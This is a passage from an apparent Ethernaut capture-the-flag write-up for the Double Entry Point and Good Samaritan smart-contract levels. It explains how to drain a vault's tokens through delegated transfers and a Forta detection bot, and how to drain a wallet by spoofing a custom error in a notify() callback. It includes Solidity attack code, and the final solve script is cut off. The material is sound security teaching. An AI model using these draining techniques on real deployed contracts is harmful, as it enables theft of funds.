 <span class="nf">if </span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">)</span> <span class="o">==</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">return</span> <span class="k">super</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
     <span class="k">return</span> <span class="nx">delegate</span><span class="p">.</span><span class="nf">delegateTransfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
 <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>I checked that the <code class="language-plaintext highlighter-rouge">delegate</code> is the address of the DoubleEntryPoint Token. And it is assigned to delegate in LegacyToken contract.</li>
  <li>So, whenever we call the <code class="language-plaintext highlighter-rouge">transfer()</code> in LegacyToken it will call the <code class="language-plaintext highlighter-rouge">delegate.delegateTransfer(to, value, msg.sender);</code>.</li>
  <li>Here the <code class="language-plaintext highlighter-rouge">delegate</code> == <code class="language-plaintext highlighter-rouge">DET</code> address. Which means the LegacyToken contract is calling the <code class="language-plaintext highlighter-rouge">delegateTransfer()</code> function of DoubleEntryPoint contract.</li>
  <li>Lets see what this function is doing,
    <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">delegateTransfer</span><span class="p">(</span>
 <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span>
 <span class="nx">uint256</span> <span class="nx">value</span><span class="p">,</span>
 <span class="nx">address</span> <span class="nx">origSender</span>
<span class="p">)</span> <span class="kr">public</span> <span class="nx">override</span> <span class="nx">onlyDelegateFrom</span> <span class="nx">fortaNotify</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
 <span class="nf">_transfer</span><span class="p">(</span><span class="nx">origSender</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
 <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>Its sending the <code class="language-plaintext highlighter-rouge">DET</code> tokens to the <code class="language-plaintext highlighter-rouge">to</code> address from the <code class="language-plaintext highlighter-rouge">origSender</code> of <code class="language-plaintext highlighter-rouge">value</code>. Lets see what are these values.</li>
  <li>When this function executes it transfers DET tokens of <code class="language-plaintext highlighter-rouge">origSender</code> to the <code class="language-plaintext highlighter-rouge">to</code> address. CryptoVault holds 100 DET tokens.</li>
  <li>So, if the <code class="language-plaintext highlighter-rouge">origSender</code> is CryptoVault and the call to <code class="language-plaintext highlighter-rouge">delegateTransfer()</code> was made by <code class="language-plaintext highlighter-rouge">LegacyToken</code> and no alerts from the <code class="language-plaintext highlighter-rouge">fortaNotify</code> will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)</li>
  <li>The <code class="language-plaintext highlighter-rouge">delegateTransfer()</code> is called by LegacyToken contract from the <code class="language-plaintext highlighter-rouge">transfer()</code> function. The <code class="language-plaintext highlighter-rouge">origSender</code> is the <code class="language-plaintext highlighter-rouge">msg.sender</code> of transfer() function in LegacyToken.</li>
  <li>So, we have to make the CryptoVault to call the <code class="language-plaintext highlighter-rouge">transfer()</code> function of the LegacyToken.</li>
  <li>We see the one <code class="language-plaintext highlighter-rouge">transfer()</code> call is made on the <code class="language-plaintext highlighter-rouge">token</code> by CryptoVault inside <code class="language-plaintext highlighter-rouge">sweepToken()</code> function.
    <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">sweepToken</span><span class="p">(</span><span class="nx">IERC20</span> <span class="nx">token</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
<span class="nf">require</span><span class="p">(</span><span class="nx">token</span> <span class="o">!=</span> <span class="nx">underlying</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Can't transfer underlying token</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">token</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">sweptTokensRecipient</span><span class="p">,</span> <span class="nx">token</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>To make the LegacyToken <code class="language-plaintext highlighter-rouge">tranfer()</code> called by the CryptoVault, we need to pass the LegacyToken instance to the <code class="language-plaintext highlighter-rouge">sweepToken()</code> function.</li>
  <li>Now the CryptoVault balance of DET token becomes zero.</li>
  <li>We identified the bug and sweeped out the DET tokens of the CryptoVault.</li>
  <li>Now we have to write a <code class="language-plaintext highlighter-rouge">detectionbot</code> to catch this bug. We are given with <code class="language-plaintext highlighter-rouge">Forta</code> interface which can be used to build the bot.</li>
  <li>We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.</li>
  <li>The <code class="language-plaintext highlighter-rouge">msg.data</code> that received at <code class="language-plaintext highlighter-rouge">fortNotify()</code>,
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = &lt;delegateTransfer() signature&gt; &lt;to&gt; &lt;value&gt; &lt;origSender&gt;
</code></pre></div>    </div>
  </li>
  <li>If we access <code class="language-plaintext highlighter-rouge">msg.data</code> inside <code class="language-plaintext highlighter-rouge">handleTransaction()</code>,
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msg.data = &lt;handleTransaction() signature&gt; &lt;user&gt; &lt;data&gt;
</code></pre></div>    </div>
  </li>
  <li>We need to extract <code class="language-plaintext highlighter-rouge">origSender</code> from the <code class="language-plaintext highlighter-rouge">msg.data</code> inside <code class="language-plaintext highlighter-rouge">handleTransaction()</code> function implemented in our bot contract.</li>
  <li>Lets see how the calldata at <code class="language-plaintext highlighter-rouge">handleTransaction()</code> is looks like,
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00 : handleTransaction signature[4 bytes]
0x04 : 0000....0000 // &lt;user&gt; address
0x24 : 0000....0000 // offset of the &lt;data&gt;
0x44 : 0000....0000 // length of the &lt;data&gt;
0x64 : 0000....0000 // &lt;data&gt;
&lt;data&gt;
0x64 : &lt;delegateTransfer() signature&gt; [4 bytes]
0x68 : 0000....0000 // &lt;to&gt; address
0x88 : 0000....0000 // &lt;value&gt;
0xA8 : 0000....0000 // &lt;origSender&gt;
</code></pre></div>    </div>
  </li>
  <li>So, the <code class="language-plaintext highlighter-rouge">origSender</code> is from the <code class="language-plaintext highlighter-rouge">0xA8</code> byte of the <code class="language-plaintext highlighter-rouge">msg.data</code> inside <code class="language-plaintext highlighter-rouge">handleTransaction()</code> function.</li>
  <li>We can use <code class="language-plaintext highlighter-rouge">calldataload</code> opcode to access the <code class="language-plaintext highlighter-rouge">origSender</code>. And if the origSender is equals to CryptoVault then raise an alert.</li>
  <li>Now our bot is ready, we have to deploy it and register the bot at <code class="language-plaintext highlighter-rouge">Forta</code> contract.</li>
  <li>And that’s enough to solve this challenge.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">DoubleEntryPointSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/DoubleEntryPoint.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">DoubleEntryPointSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="nx">DoubleEntryPoint</span> <span class="kr">public</span> <span class="nx">det</span> <span class="o">=</span> <span class="nc">DoubleEntryPoint</span><span class="p">(</span><span class="mh">0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">address</span> <span class="nx">cryptovault</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">cryptoVault</span><span class="p">();</span>
        <span class="nx">address</span> <span class="nx">player</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">player</span><span class="p">();</span>
        <span class="nx">address</span> <span class="nx">delegatedFrom</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">delegatedFrom</span><span class="p">();</span> <span class="c1">// Legacy Token Address</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">CryptoVault : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">cryptovault</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Player : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">player</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">LGT : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">delegatedFrom</span><span class="p">);</span>

        <span class="nx">LegacyToken</span> <span class="nx">lgt</span> <span class="o">=</span> <span class="nc">LegacyToken</span><span class="p">(</span><span class="nx">delegatedFrom</span><span class="p">);</span>
        <span class="nx">CryptoVault</span> <span class="nx">cv</span> <span class="o">=</span> <span class="nc">CryptoVault</span><span class="p">(</span><span class="nx">cryptovault</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">CryptoVault balance of DET : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">det</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">cryptovault</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">CryptoVault balance of LGT : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">lgt</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">cryptovault</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Delegate of LGT : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">lgt</span><span class="p">.</span><span class="nf">delegate</span><span class="p">()));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DET : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">det</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Both are same</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">Forta</span> <span class="nx">forta</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">forta</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">registering bot.........</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">DetectionBot</span> <span class="nx">bot</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DetectionBot</span><span class="p">();</span>

        <span class="nx">forta</span><span class="p">.</span><span class="nf">setDetectionBot</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">bot</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">BOT ALERTS Before exploit : </span><span class="dl">"</span><span class="p">,</span><span class="nx">forta</span><span class="p">.</span><span class="nf">botRaisedAlerts</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">bot</span><span class="p">)));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Exploiting DET...........</span><span class="dl">"</span><span class="p">);</span>

        <span class="c1">// new Attack().exploit();  // reverts because bot detects the exploit</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">CryptoVault balance of DET : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">det</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">cryptovault</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">BOT ALERTS After exploit : </span><span class="dl">"</span><span class="p">,</span><span class="nx">forta</span><span class="p">.</span><span class="nf">botRaisedAlerts</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">bot</span><span class="p">)));</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">DoubleEntryPoint</span> <span class="kr">public</span> <span class="nx">det</span> <span class="o">=</span> <span class="nc">DoubleEntryPoint</span><span class="p">(</span><span class="mh">0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C</span><span class="p">);</span>
    <span class="nx">address</span> <span class="kr">public</span>  <span class="nx">cryptovault</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">cryptoVault</span><span class="p">();</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">player</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">player</span><span class="p">();</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">delegatedFrom</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">delegatedFrom</span><span class="p">();</span> <span class="c1">// Legacy Token Address</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="nx">CryptoVault</span> <span class="nx">cv</span> <span class="o">=</span> <span class="nc">CryptoVault</span><span class="p">(</span><span class="nx">cryptovault</span><span class="p">);</span>

        <span class="nx">cv</span><span class="p">.</span><span class="nf">sweepToken</span><span class="p">(</span><span class="nc">IERC20</span><span class="p">(</span><span class="nx">delegatedFrom</span><span class="p">));</span>

    <span class="p">}</span>

<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">DetectionBot</span><span class="p">{</span>

    <span class="nx">DoubleEntryPoint</span> <span class="kr">public</span> <span class="nx">det</span> <span class="o">=</span> <span class="nc">DoubleEntryPoint</span><span class="p">(</span><span class="mh">0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C</span><span class="p">);</span>
    <span class="nx">address</span> <span class="kr">public</span>  <span class="nx">cryptovault</span> <span class="o">=</span> <span class="nx">det</span><span class="p">.</span><span class="nf">cryptoVault</span><span class="p">();</span>

    <span class="kd">function</span> <span class="nf">handleTransaction</span><span class="p">(</span><span class="nx">address</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">msgData</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
        <span class="nx">address</span> <span class="nx">origSender</span><span class="p">;</span>

        <span class="nx">assembly</span> <span class="p">{</span>
            <span class="nl">origSender</span> <span class="p">:</span><span class="o">=</span> <span class="nf">calldataload</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">)</span>
        <span class="p">}</span>

        <span class="nf">if </span><span class="p">(</span><span class="nx">origSender</span> <span class="o">==</span><span class="nx">cryptovault</span> <span class="p">){</span>
            <span class="nc">Forta</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nf">raiseAlert</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span> <span class="c1">// raise alert of Forta contract</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/DoubleEntryPointSolve.s.sol:DoubleEntryPointSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="27-good-samaritan">27 Good Samaritan</h1>

<p><code class="language-plaintext highlighter-rouge">GoodSamaritan.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span> <span class="o">&lt;</span><span class="mf">0.9</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/utils/Address.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GoodSamaritan</span> <span class="p">{</span>
    <span class="nx">Wallet</span> <span class="kr">public</span> <span class="nx">wallet</span><span class="p">;</span>
    <span class="nx">Coin</span> <span class="kr">public</span> <span class="nx">coin</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">wallet</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Wallet</span><span class="p">();</span>
        <span class="nx">coin</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Coin</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">wallet</span><span class="p">));</span>

        <span class="nx">wallet</span><span class="p">.</span><span class="nf">setCoin</span><span class="p">(</span><span class="nx">coin</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">requestDonation</span><span class="p">()</span> <span class="nx">external</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">bool</span> <span class="nx">enoughBalance</span><span class="p">){</span>
        <span class="c1">// donate 10 coins to requester</span>
        <span class="k">try</span> <span class="nx">wallet</span><span class="p">.</span><span class="nf">donate10</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="nf">catch </span><span class="p">(</span><span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nf">if </span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">NotEnoughBalance()</span><span class="dl">"</span><span class="p">))</span> <span class="o">==</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">err</span><span class="p">))</span> <span class="p">{</span>
                <span class="c1">// send the coins left</span>
                <span class="nx">wallet</span><span class="p">.</span><span class="nf">transferRemainder</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Coin</span> <span class="p">{</span>
    <span class="nx">using</span> <span class="nx">Address</span> <span class="k">for</span> <span class="nx">address</span><span class="p">;</span>

    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>

    <span class="nx">error</span> <span class="nc">InsufficientBalance</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">current</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">required</span><span class="p">);</span>

    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">wallet_</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// one million coins for Good Samaritan initially</span>
        <span class="nx">balances</span><span class="p">[</span><span class="nx">wallet_</span><span class="p">]</span> <span class="o">=</span> <span class="mi">10</span><span class="o">**</span><span class="mi">6</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">dest_</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount_</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">currentBalance</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>

        <span class="c1">// transfer only occurs if balance is enough</span>
        <span class="nf">if</span><span class="p">(</span><span class="nx">amount_</span> <span class="o">&lt;=</span> <span class="nx">currentBalance</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">amount_</span><span class="p">;</span>
            <span class="nx">balances</span><span class="p">[</span><span class="nx">dest_</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">amount_</span><span class="p">;</span>

            <span class="c1">//if(dest_.isContract()) { </span>
            <span class="nf">if </span><span class="p">(</span><span class="nx">dest_</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
                <span class="c1">// notify contract </span>
                <span class="nc">INotifyable</span><span class="p">(</span><span class="nx">dest_</span><span class="p">).</span><span class="nf">notify</span><span class="p">(</span><span class="nx">amount_</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">InsufficientBalance</span><span class="p">(</span><span class="nx">currentBalance</span><span class="p">,</span> <span class="nx">amount_</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Wallet</span> <span class="p">{</span>
    <span class="c1">// The owner of the wallet instance</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

    <span class="nx">Coin</span> <span class="kr">public</span> <span class="nx">coin</span><span class="p">;</span>

    <span class="nx">error</span> <span class="nc">OnlyOwner</span><span class="p">();</span>
    <span class="nx">error</span> <span class="nc">NotEnoughBalance</span><span class="p">();</span>

    <span class="nx">modifier</span> <span class="nf">onlyOwner</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">!=</span> <span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">OnlyOwner</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">donate10</span><span class="p">(</span><span class="nx">address</span> <span class="nx">dest_</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="c1">// check balance left</span>
        <span class="nf">if </span><span class="p">(</span><span class="nx">coin</span><span class="p">.</span><span class="nf">balances</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">NotEnoughBalance</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// donate 10 coins</span>
            <span class="nx">coin</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">dest_</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">transferRemainder</span><span class="p">(</span><span class="nx">address</span> <span class="nx">dest_</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="c1">// transfer balance left</span>
        <span class="nx">coin</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">dest_</span><span class="p">,</span> <span class="nx">coin</span><span class="p">.</span><span class="nf">balances</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">setCoin</span><span class="p">(</span><span class="nx">Coin</span> <span class="nx">coin_</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="nx">coin</span> <span class="o">=</span> <span class="nx">coin_</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">interface</span> <span class="nx">INotifyable</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nf">notify</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Would you be able to drain all the balance from his Wallet?</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>There in total three contract are given to us. <code class="language-plaintext highlighter-rouge">GoodSamaritan</code> contract deployes <code class="language-plaintext highlighter-rouge">Wallet</code> and <code class="language-plaintext highlighter-rouge">Coin</code> contracts.</li>
  <li>Good samaritan will be the <code class="language-plaintext highlighter-rouge">owner</code> of the <code class="language-plaintext highlighter-rouge">Wallet</code> contract. And the wallet contract will have 10**6 Coin balances.</li>
  <li>We are given with the GoodSamaritan instance address. We can able to call the <code class="language-plaintext highlighter-rouge">requestDonation()</code> function to get 10 coins from the GoodSamaritan’s Wallet.</li>
  <li>One call to <code class="language-plaintext highlighter-rouge">requestDonation()</code> will get 10 coins only. To drain all the coins of the Wallet we need to call the <code class="language-plaintext highlighter-rouge">requestDonation()</code> function <code class="language-plaintext highlighter-rouge">100000</code> times which requires more gas.</li>
  <li>Instead we can try to invoke the <code class="language-plaintext highlighter-rouge">withdrawRemainder()</code> function which will send all the coins at a time.</li>
  <li>The <code class="language-plaintext highlighter-rouge">withdrawRemainder()</code> is called when the <code class="language-plaintext highlighter-rouge">wallet.donate10(msg.sender)</code> returns error <code class="language-plaintext highlighter-rouge">NotEnoughBalance()</code> defined inside Wallet contract.</li>
  <li>GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.</li>
  <li>So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the <code class="language-plaintext highlighter-rouge">Coin</code> contract it notifies the sender if the sender is a contract.</li>
  <li>This means it calls to our <code class="language-plaintext highlighter-rouge">msg.sender</code>, now we can implement the <code class="language-plaintext highlighter-rouge">notify()</code> function inside our Attack contract and revert with the <code class="language-plaintext highlighter-rouge">NotEnoughBalance()</code> error when receiving the 10 coins.</li>
  <li>We should revert the <code class="language-plaintext highlighter-rouge">NotEnoughBalance()</code> error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.</li>
  <li>For this I used the amount parameter sent by the Coin contract through the notify call.</li>
  <li>Now GoodSamaritan gets the error <code class="language-plaintext highlighter-rouge">NotEnoughBalance()</code> when it sends 10 coins to us, immediately it will send whole coins to us.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">GoodSamaritanSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/GoodSamaritan.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GoodSamaritanSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="nx">GoodSamaritan</span> <span class="kr">public</span> <span class="nx">gs</span> <span class="o">=</span> <span class="nc">GoodSamaritan</span><span class="p">(</span><span class="mh">0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
